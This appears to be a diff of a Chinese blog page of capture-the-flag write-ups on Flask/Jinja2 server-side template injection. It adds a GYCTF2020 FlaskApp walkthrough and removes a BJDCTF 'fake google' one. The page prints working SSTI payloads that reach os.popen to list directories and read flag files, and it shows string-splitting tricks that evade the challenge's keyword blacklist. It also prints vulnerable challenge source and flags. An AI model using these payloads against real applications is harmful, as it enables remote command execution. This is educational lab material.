+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">:</span>
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>        <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>            <span class="n">p</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'nickname'</span><span class="p">)</span>
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>            <span class="nb">id</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">nicknames</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>            <span class="k">if</span> <span class="n">p</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
+</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>                <span class="k">if</span> <span class="s1">'.'</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">or</span> <span class="s1">'_'</span> <span class="ow">in</span> <span class="n">p</span> <span class="ow">or</span> <span class="s1">'</span><span class="se">\'</span><span class="s1">'</span> <span class="ow">in</span> <span class="n">p</span><span class="p">:</span>
+</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>                    <span class="k">return</span> <span class="s1">'Your nickname contains restricted characters!'</span>
+</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>                <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">nicknames</span><span class="p">[</span><span class="nb">id</span><span class="p">]</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span>
+</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>            <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>            <span class="k">return</span> <span class="s1">'Exception'</span>
+</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">)</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>解密脚本</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">KEY1</span> <span class="o">=</span> <span class="s2">"GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3"</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">KEY2</span> <span class="o">=</span> <span class="s2">"xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT"</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>    <span class="n">k1</span> <span class="o">=</span> <span class="n">KEY1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>    <span class="k">return</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">k1</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">KEY2</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">cipher</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>取密文：<code>{{config["flag"]|tojson}}</code>，然后 <code>json.loads</code> 还原成字符串再解。</strong></p>
+</details>
+<hr />
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 页面点不动就以为题坏了</strong></p>
+<p>是 jQuery 的 CDN 挂了。<strong>看到"能开但按钮没反应"，先看 Console 有没有 <code>$ is not defined</code>。</strong></p>
+<p><strong>② 用 <code>url_for</code> 想省事，结果写不出来</strong></p>
+<p><code>url_for</code> 名字里带下划线，而名字<strong>不能转义</strong>。改用 <code>lipsum</code>（名字干净）。</p>
+<p><strong>③ <code>x2e</code> 少了反斜杠</strong></p>
+<p>转义是 <code>\x2e</code>，不是 <code>x2e</code>。</p>
+<p><strong>④ 把 <code>\x2e</code> 用在语法位置</strong></p>
+<p><code>["os"]</code> 前面的那个点是<strong>语法</strong>，不能转义，只能换写法。</p>
+<p><strong>⑤ <code>listdir</code> 给了个文件</strong></p>
+<p>程序把异常吞成 <code>Exception</code>，看不出原因。<strong><code>listdir</code> 要目录，<code>open</code> 要文件。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-11-01 18:40:00+00:00">2026-11-01</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/python/" class="md-meta__link">Python</a>, 
+              <a href="category/flask/" class="md-meta__link">Flask</a>, 
+              <a href="category/ssti/" class="md-meta__link">SSTI</a></li>
         
         
           
@@ -3218,110 +3522,121 @@
     </div>
   </header>
   <div class="md-post__content md-typeset">
-    <h2 id="bjdctf-2nd-fake-google-ssti"><a class="toclink" href="bjdctf2-fake-google-ssti/">[BJDCTF 2<sup>nd</sup>] fake google — 我的第一道 SSTI</a></h2>
+    <h2 id="gyctf2020-flaskapp"><a class="toclink" href="gyctf2020-flaskapp-ssti/">[GYCTF2020] FlaskApp — 一张黑名单，两条链</a></h2>
 <blockquote>
-<p><strong>题目类型</strong>：Web — Flask / Jinja2 模板注入（SSTI）</p>
+<p><strong>题目类型</strong>：Web — Flask SSTI（有过滤）</p>
 <p><strong>题目地址</strong>：BUUCTF / ctf2 复刻环境</p>
-<p><strong>Flag</strong>：<code>CTF2{4ba1fadc-b09a-441d-baf8-191ea2b8a4dd}</code></p>
+<p><strong>Flag</strong>：<code>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}</code></p>
 </blockquote>
 <hr />
-<h3 id="_1"><a class="toclink" href="bjdctf2-fake-google-ssti/#_1">题目概述</a></h3>
-<p>进入界面只有一个输入框。</p>
-<p><strong>先试 SQL 注入，发现无论输入什么，它都直接打印出来——不像是在查数据库。</strong></p>
-<p><strong>查看源码，在 <code>qaq</code> 那个位置发现了提示：<code>sssssti &amp; a little trick</code>。这就是 SSTI，模板注入。</strong></p>
-<p><strong>这是我第一次做 SSTI，所以每一步都写下来了。</strong></p>
+<h3 id="_1"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_1">题目概述</a></h3>
+<p>进入靶场发现是一个加解密的方式，先随便加密解密试试。</p>
+<p>这里发现，<strong>解密时会把解密的内容打印出来</strong>——那就有戏了。</p>
 <hr />
-<h3 id="_2"><a class="toclink" href="bjdctf2-fake-google-ssti/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="bjdctf2-fake-google-ssti/#step-1">Step 1：确认模板被执行</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>{{7*7}}   →  49
+<h3 id="_2"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_2">解题过程</a></h3>
+<h4 id="step-177-nonono"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-177-nonono">Step 1：<code>{{7*7}}</code> 返回 <code>nonono</code></a></h4>
+<p>先试一下 <code>{{7*7}}</code>，返回的是 <code>nonono</code>。</p>
+<p><strong>这个 <code>nonono</code> 就明确了我们的思路是对的，只不过有东西被过滤了。</strong></p>
+<p>接着我去试，发现被过滤的有这些：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>*  eval  os  subprocess  popen  import  system  request  flag
 </span></code></pre></div>
-<p><strong>如果回显的是 <code>{{7*7}}</code> 原文，说明只是字符串拼接；回显 49，说明你的输入进了模板引擎，被真的求值了。</strong></p>
-<h4 id="step-2-jinja2"><a class="toclink" href="bjdctf2-fake-google-ssti/#step-2-jinja2">Step 2：确认是 Jinja2</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>{{7*'7'}}  →  7777777
+<p><strong>（是子串匹配、不分大小写。所以 <code>host</code> 这种词也会中招 —— 里面含 <code>os</code>。）</strong></p>
+<p><strong>能过的是：</strong><code>config</code> <code>self</code> <code>session</code> <code>url_for</code> <code>lipsum</code> <code>globals</code> <code>builtins</code> <code>class</code> <code>open</code> <code>cat</code> <code>read</code> <code>+</code></p>
+<p><strong>注意 <code>+</code> 没被过滤</strong>，所以后面全靠拼接绕过。</p>
+<h4 id="step-2-flask"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-2-flask">Step 2：确认是 Flask，先试短路</a></h4>
+<p>试试 <code>{{config}}</code>，出来了 Flask 的配置对象 —— 确认是 Flask（其实题名也提示了）。</p>
+<p>那先试试 <code>url_for</code> 能不能正常使用，结论是可行的：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
 </span></code></pre></div>
-<p><img alt="Jinja2 确认" src="../assets/images/bjdctf2-fake-google/01-jinja2-7777777.png" /></p>
-<p><strong>这个探针是用来区分引擎的：Jinja2 里 <code>'7'</code> 是字符串，重复 7 次得到 <code>7777777</code>；Twig（PHP）里会当成数字，得到 49。</strong></p>
-<h4 id="step-3-flask"><a class="toclink" href="bjdctf2-fake-google-ssti/#step-3-flask">Step 3：确认是 Flask</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>{{config}}   →  Flask 的配置对象
+<h4 id="step-3-net"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-3-net">Step 3：这里我卡住了 —— 页面没回显，Net 里看到重定向</a></h4>
+<p>接着再试 <code>{{url_for.__globals__}}</code>，<strong>但是页面没有回显</strong>，看了一下 Net 发现被重定向了。</p>
+<p><strong>这里我实在不明白原因。</strong>BP 抓包抓下来的响应里，session 里有一大串数据，但是解码不出来。</p>
+<blockquote>
+<p><strong>后来搞明白了，记在这里：</strong></p>
+<p>这题用的是 <strong>POST-Redirect-GET</strong> 模式：</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">():</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'GET'</span><span class="p">:</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'res'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'decode.html'</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="p">)</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'res'</span><span class="p">]</span> <span class="o">=</span> <span class="n">res</span>          <span class="c1"># 结果塞进 session（flash）</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">)</span>    <span class="c1"># 302</span>
 </span></code></pre></div>
-<p><strong><code>config</code> 是 Flask 注入模板的全局变量。它出现就说明是 Flask，顺便还可能看到 SECRET_KEY。</strong></p>
-<p><strong>到这一步，两条路都可以走了。</strong></p>
+<p><strong>所以：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>③ 结果越长，cookie 越大
+</span></code></pre></div>
+<p><strong>我看到的"没回显"，其实是在看 302 的响应体（内容是 <code>Redirecting...</code>）。</strong>跟过滤无关，是流程问题。</p>
+</blockquote>
+<h4 id="step-4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-4">Step 4：短路打通</a></h4>
+<p><code>url_for.__globals__</code> 本身是通的，卡住的是<strong>再往下取 <code>['os']</code></strong> —— 因为 <code>os</code> 在名单里。</p>
+<p><strong>但 <code>+</code> 没被过滤，所以可以拼：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{{url_for.__globals__['o'+'s']}}
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>→  &lt;module 'os' from '/usr/local/lib/python3.7/os.py'&gt;
+</span></code></pre></div>
+<p>这个又能正常回显了。</p>
+<h4 id="step-5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-5">Step 5：先找文件名</a></h4>
+<p><code>popen</code> 被拦，所以也拼一下；然后<strong>先 <code>ls /</code></strong>，因为我们还不知道 flag 叫什么：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var
+</span></code></pre></div>
+<p><strong>根目录下有个 <code>this_is_the_flag.txt</code>。文件名是这一步才知道的。</strong></p>
+<h4 id="step-6"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-6">Step 6：读出来</a></h4>
+<p>注意 <code>flag</code> 这个词也被拦，所以路径也要拼（<code>'this_is_the_fl'</code> + <code>'ag.txt'</code>）：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}
+</span></code></pre></div>
+<h4 id="step-7"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-7">Step 7：换一条路（长链）</a></h4>
+<p>短路能通，是因为 Flask 注入了 <code>url_for</code>。<strong>换个环境把 <code>url_for</code> 删了，这条路就断。</strong>所以再走一遍长链——从字面量 <code>''</code> 开始爬。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>→  &lt;class '_py_warnings.catch_warnings'&gt;
+</span></code></pre></div>
+<p><strong>（<code>__name__</code> 是四个下划线；<code>name</code> 不出东西。另外 <code>equalto</code> 要加引号，不加会报 <code>no test named Undefined</code>。）</strong></p>
+<p>然后接 <code>['__init__']['__globals__']['__builtins__']</code>，拿到 builtins 的 dict。</p>
+<p><strong>接下来我一开始想用 <code>eval</code>，直接给出去的版本报了 <code>nonono</code>，我不知道是哪个还被过滤了。</strong></p>
+<blockquote>
+<p><strong>答案：是 <code>"os"</code>。</strong></p>
+<p>我把 <code>import</code> 拆了、<code>popen</code> 拆了、<code>eval</code> 拆了，<strong>唯独把 <code>"os"</code> 原样写在了字符串里</strong> —— 那两个字面量照样会被匹配。</p>
+<p>拆开之后：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')
+</span></code></pre></div>
+</blockquote>
+<p><strong>完整的一条：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>{{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
+</span></code></pre></div>
+<p><strong>也是先 <code>ls /</code> 再 <code>cat</code>，一样拿不到名字就没法读。</strong></p>
 <hr />
-<h3 id="_3"><a class="toclink" href="bjdctf2-fake-google-ssti/#_3">路线一：从字面量往上爬（通用链）</a></h3>
-<p><strong>这条路不依赖任何框架给的名字，只靠 Python 的对象关系。</strong></p>
-<h4 id="_4"><a class="toclink" href="bjdctf2-fake-google-ssti/#_4">第一环：字符串的类</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>{{''.__class__}}     →  &lt;class 'str'&gt;
+<h3 id="_3"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>加解密功能 → 解密的结果被当模板渲染
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  → {{7*7}} 回 nonono → 有黑名单，但思路对
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    → {{config}} 确认 Flask
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>      → url_for 能用 → 短路：url_for.__globals__
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>          → ls / 找到 this_is_the_flag.txt
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>            → cat 它（flag 也被拦，路径也拼）→ flag
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>              → 再走一遍长链验证：'' → subclasses → catch_warnings
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>                → __builtins__ → eval（import/os/popen 全要拆）→ flag
 </span></code></pre></div>
-<h4 id="_5"><a class="toclink" href="bjdctf2-fake-google-ssti/#_5">第二环：它的父类</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>{{''.__class__.__bases__[0]}}   →  &lt;class 'object'&gt;
+<h4 id="_4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_4">漏洞原理</a></h4>
+<p><strong>① 解密结果被当成模板源码</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 </span></code></pre></div>
-<p><strong>⚠️ 这里有个坑：<code>__base__</code>（单数）是</strong>一个类<strong>，不能下标；<code>__bases__</code>（复数）是</strong>元组<strong>，才能写 <code>[0]</code>。写成 <code>__base__[0]</code> 会返回空。</strong></p>
-<h4 id="_6"><a class="toclink" href="bjdctf2-fake-google-ssti/#_6">第三环：所有子类</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>{{''.__class__.__bases__[0].__subclasses__()}}   →  一大串类
+<p><strong>base64 只是把输入换了个形式，并没有让它变成"数据"。解密之后它照样进模板引擎求值。</strong></p>
+<p><strong>② 黑名单是"词"，绕过靠"拼接"</strong></p>
+<p>过滤器查的是<strong>你原文里有没有那串字母</strong>；Jinja 求值时会把 <code>+</code> 算掉，得到完整字符串。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>原文：'o'+'s'      → 不含 os
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>求值：'os'          → 才是真正的属性名
 </span></code></pre></div>
-<p><strong>这一步是分水岭：拿到的是内存里</strong>所有已加载的类<strong>。</strong></p>
-<h4 id="_7"><a class="toclink" href="bjdctf2-fake-google-ssti/#_7">第四环：找一个“身上带着模块全局空间”的类</a></h4>
-<p><strong>核心思路：找一个 <code>__init__.__globals__</code> 里带 <code>__builtins__</code> 或者直接带 <code>os</code> 的类。</strong></p>
-<p><strong>常见的几个候选：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>catch_warnings        → warnings 模块，globals 里有 __builtins__
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>_wrap_close           → os 模块，globals 里直接有 popen
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Popen                 → subprocess
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>FileLoader            → importlib
-</span></code></pre></div>
-<p><strong>怎么知道它们在列表第几个？我写了个本地脚本扫了一遍：</strong></p>
-<p><img alt="脚本找下标" src="../assets/images/bjdctf2-fake-google/02-script-indices.png" /></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">((</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">())):</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">'catch_warnings'</span><span class="p">,</span> <span class="s1">'_wrap_close'</span><span class="p">,</span> <span class="s1">'Popen'</span><span class="p">,</span> <span class="s1">'FileLoader'</span><span class="p">):</span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">,</span> <span class="s1">'-&gt;'</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__module__</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">)</span>
-</span></code></pre></div>
-<p><strong>⚠️ 下标是环境相关的。</strong>同样的脚本，在不同 Python 版本、不同 import 顺序下会给出不同的数字。我这边 <code>catch_warnings</code> 是 169、<code>_wrap_close</code> 是 117，靶机正好一致才打通的。<strong>换个环境就得重扫，或者用按名字筛的写法</strong>（见文末）。</p>
-<h4 id="_wrap_close-popen"><a class="toclink" href="bjdctf2-fake-google-ssti/#_wrap_close-popen">第五环：用 <code>_wrap_close</code> 直接拿 popen</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}
-</span></code></pre></div>
-<p><strong><code>_wrap_close</code> 是 <code>os</code> 模块里的类，它的 <code>__init__.__globals__</code> 就是 <code>os</code> 模块的全局空间，里面直接有 <code>popen</code>，一步到位。</strong></p>
-<h4 id="catch_warnings-__builtins__"><a class="toclink" href="bjdctf2-fake-google-ssti/#catch_warnings-__builtins__">另一种：用 <code>catch_warnings</code> 走 <code>__builtins__</code></a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}
-</span></code></pre></div>
-<p><strong>为什么要绕 <code>eval</code> 和 <code>__import__</code>？因为 <code>catch_warnings</code> 的 globals 里没有 <code>os</code>，但有 <code>__builtins__</code>；<code>__builtins__</code> 里有 <code>__import__</code>，能 import 就能拿到任何模块。</strong></p>
-<p><strong>（<code>__builtins__</code> 在不同上下文里有时是 dict、有时是模块，所以有的写法用 <code>['__builtins__']</code>，有的用 <code>.builtins__</code>——注意前者是取键，后者是取属性。）</strong></p>
-<hr />
